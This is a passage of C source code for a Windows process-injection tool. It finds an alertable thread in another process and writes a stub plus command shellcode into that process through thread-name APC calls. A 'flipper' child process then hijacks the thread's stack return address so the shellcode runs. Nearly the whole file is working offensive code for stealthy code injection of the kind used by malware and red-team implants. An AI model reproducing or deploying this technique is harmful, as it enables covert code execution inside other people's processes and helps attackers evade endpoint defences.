    0x4C, 0x50, 0x53, 0x50, 0x56, 0x67, 0x65, 0x50, 0x52, 0x48, 0x6D 
};

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

//
// If set to TRUE, all children created will be created with MITIGATION_POLICY_HARDENED enabled
// 

#define SPAWN_HARDENED_CHILDREN TRUE

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


static int GrandparentMain(IN LPCWSTR pwszSelfNtPath, IN LPCWSTR pwszSelfWin32Path)
{
    WCHAR wszCommandLine[MAX_PATH * 2] = { 0 };

    // Positional argv:
    //   argv[0] = "<self>"
    //   argv[1] = "writer"
    wsprintfW(wszCommandLine, L"\"%s\" writer", pwszSelfWin32Path);

    if (!SpawnChildProcess(pwszSelfNtPath, wszCommandLine, SPAWN_HARDENED_CHILDREN, NULL, 0x00))
    {
        DBG("[!] SpawnChildProcess [%d] Failed", __LINE__);
        return -1;
    }

    DBG("[*] Grandparent: Spawned Writer Child Successfully");
    return 0;
}

static int WriterChildMain(IN LPCWSTR pwszSelfNtPath, IN LPCWSTR pwszSelfWin32Path)
{
    DWORD       dwProcessId                     = 0x00,
                dwThreadId                      = 0x00;
    HANDLE      hProcess                        = NULL,
                hThread                         = NULL;
    WCHAR       wszProcName[MAX_PATH]           = { 0 };
    PVOID       pAllocatedAddress               = NULL;
    PBYTE       pWrappedPayload                 = NULL;
    ULONG       uWrappedSize                    = 0x00;
    ULONG_PTR   uShellcodeEntry                 = 0x00;
    HANDLE      hInheritList[2]                 = { 0 };
    WCHAR       wszCommandLine[MAX_PATH * 2]    = { 0 };
    int         iExitCode                       = -1;

    // Target Thread/Process Discovery
    if (!FindAlertableThread(&dwProcessId, &dwThreadId, &hProcess, &hThread, wszProcName))
    {
        DBG("[!] FindAlertableThread Failed");
        goto _END_OF_FUNC;
    }

    DBG("[+] Writer: Alertable Thread Found: %ws (Process ID=%lu, Thread ID=%lu)", wszProcName, dwProcessId, dwThreadId);

    // Wrapped buffer carries [stub][payload][8-byte hijack pointer at tail].
    // The tail bytes become the source for the Flipper's RtlMoveMemory APC that
    // atomically overwrites [Rsp]. 
    uWrappedSize = (ULONG)WTH_STUB_SIZE + (ULONG)sizeof(x64CmdShellcode) + (ULONG)sizeof(ULONG_PTR);

    if (!(pWrappedPayload = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uWrappedSize)))
    {
        DBG("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    RtlCopyMemory(pWrappedPayload,                  g_WthStub,          WTH_STUB_SIZE);
    RtlCopyMemory(pWrappedPayload + WTH_STUB_SIZE,  x64CmdShellcode,    sizeof(x64CmdShellcode));

    if (!(pAllocatedAddress = AllocateVirtualMemory(hProcess, uWrappedSize, PAGE_READWRITE)))
    {
        DBG("[!] AllocateVirtualMemory Failed");
        goto _END_OF_FUNC;
    }

    // Hijack pointer = pAllocatedAddress + stub offset. Can only be computed after
    // AllocateVirtualMemory returns (we need the target base). Planted at the tail
    // of the local wrapped buffer; WriteMemoryViaThreadNameApc will carry it into
    // the target as part of the normal payload delivery, and the Flipper's stack
    // hand-off APC reads it from there to overwrite [Rsp].
    uShellcodeEntry = (ULONG_PTR)pAllocatedAddress + WTH_STUB_CODE_OFFSET;
    *(ULONG_PTR*)(pWrappedPayload + WTH_STUB_SIZE + sizeof(x64CmdShellcode)) = uShellcodeEntry;

    DBG("[+] Writer: Wrapped Payload Built (%lu Stub + %lu Payload + %lu Hijack-ptr = %lu total)",
        (ULONG)WTH_STUB_SIZE, (ULONG)sizeof(x64CmdShellcode), (ULONG)sizeof(ULONG_PTR), uWrappedSize);
    DBG("[+] Writer: Hijack Ptr 0x%p Planted at Tail Offset %lu",
        (PVOID)uShellcodeEntry, (ULONG)(WTH_STUB_SIZE + sizeof(x64CmdShellcode)));
    DBG("[+] Writer: Payload Buffer Allocated At: 0x%p (%lu bytes)", pAllocatedAddress, uWrappedSize);

    if (!WriteMemoryViaThreadNameApc(hProcess, hThread, pAllocatedAddress, pWrappedPayload, uWrappedSize, FALSE))
    {
        DBG("[!] WriteMemoryViaThreadNameApc Failed");
        goto _END_OF_FUNC;
    }

    // Spawn Flipper child
    //
    // Positional argv:
    //   argv[0] = "<self>"
    //   argv[1] = "flipper"
    //   argv[2] = hProcess value (hex)
    //   argv[3] = hThread value (hex)
    //   argv[4] = pAllocatedAddress (hex)
    //   argv[5] = uWrappedSize (hex)              
    //
    wsprintfW(wszCommandLine, L"\"%s\" flipper 0x%p 0x%p 0x%p 0x%X", pwszSelfWin32Path,
        hProcess, hThread, pAllocatedAddress, uWrappedSize);

    hInheritList[0] = hProcess;
    hInheritList[1] = hThread;

    if (!SpawnChildProcess(pwszSelfNtPath, wszCommandLine, SPAWN_HARDENED_CHILDREN, hInheritList, 2))
    {
        DBG("[!] SpawnChildProcess Failed");
        goto _END_OF_FUNC;
    }

    DBG("[*] Writer: Spawned Flipper Child Successfully");

    iExitCode = 0;

_END_OF_FUNC:
    if (pWrappedPayload)
        HeapFree(GetProcessHeap(), 0x00, pWrappedPayload);

    // Do not close hProcess / hThread - they were handed to the Flipper via the inherit list
    return iExitCode;
}

static int FlipperChildMain(IN int argc, IN WCHAR* argv[])
{
    HANDLE      hProcess                = NULL,
                hThread                 = NULL;
    PVOID       pAllocatedAddress       = NULL;
    SIZE_T      cbSize                   = 0x00;
    int         iExitCode               = -1;

    if (argc < 6)
    {
        DBG("[!] Flipper: Expected 6 Arguments, Got %d", argc);
        return -1;
    }

    // argv[2..5] = hProcess, hThread, pAllocatedAddress, uSize (combined stub+payload length)
    hProcess            = (HANDLE)(ULONG_PTR)wcstoull(argv[2], NULL, 16);
    hThread             = (HANDLE)(ULONG_PTR)wcstoull(argv[3], NULL, 16);
    pAllocatedAddress   = (PVOID)(ULONG_PTR)wcstoull(argv[4], NULL, 16);
    cbSize               = (SIZE_T)wcstoull(argv[5], NULL, 16);

    DBG("[+] Flipper: hProcess=0x%p, hThread=0x%p, pAllocatedAddress=0x%p, cbSize=%lu",
        hProcess, hThread, pAllocatedAddress, (ULONG)cbSize);

    if (!HijackThreadReturnAddress(hProcess, hThread, pAllocatedAddress, cbSize))
    {
        DBG("[!] HijackThreadReturnAddress Failed");
        goto _END_OF_FUNC;
    }

    DBG("[*] Bye!");

    iExitCode = 0;

_END_OF_FUNC:
    return iExitCode;
}


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

int wmain(int argc, WCHAR* argv[])
{
    HMODULE     hNtdll                              = NULL;
    WCHAR       wszSelfWin32Path[MAX_PATH]          = { 0 };
    WCHAR       wszSelfNtPath[MAX_PATH + 4]         = { 0 };    // "\??\" prefix
    int         iExitCode                           = -1;

    if (!(hNtdll = GetModuleHandle(TEXT("NTDLL"))))
    {
        DBG("[!] GetModuleHandle Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!InitializeUnguardGadget(hNtdll, 0))
        goto _END_OF_FUNC;

    if (!InitializeWinNtAPIsGlobal())
        goto _END_OF_FUNC;

    // Resolve own path (needed by grandparent + writer for spawning)
    if (!GetModuleInfoFromHandle(NULL, NULL, wszSelfWin32Path))
    {
        DBG("[!] GetModuleInfoFromHandle Failed");
        goto _END_OF_FUNC;
    }
    wsprintfW(wszSelfNtPath, L"\\??\\%s", wszSelfWin32Path);

    // Role Dispatch 
    if (argc == 1)
    {
        DBG("[+] Role: Grandparent");
        iExitCode = GrandparentMain(wszSelfNtPath, wszSelfWin32Path);

    }
    else if (argc >= 2 && lstrcmpiW(argv[1], L"writer") == 0)
    {
        DBG("[+] Role: Writer");
        iExitCode = WriterChildMain(wszSelfNtPath, wszSelfWin32Path);
    }
    else if (argc >= 2 && lstrcmpiW(argv[1], L"flipper") == 0)
    {
        DBG("[+] Role: Flipper");
        iExitCode = FlipperChildMain(argc, argv);
    }
    else
    {
        DBG("[!] Unknown Role: %ws", argv[1]);
    }

_END_OF_FUNC:
    return iExitCode;
}


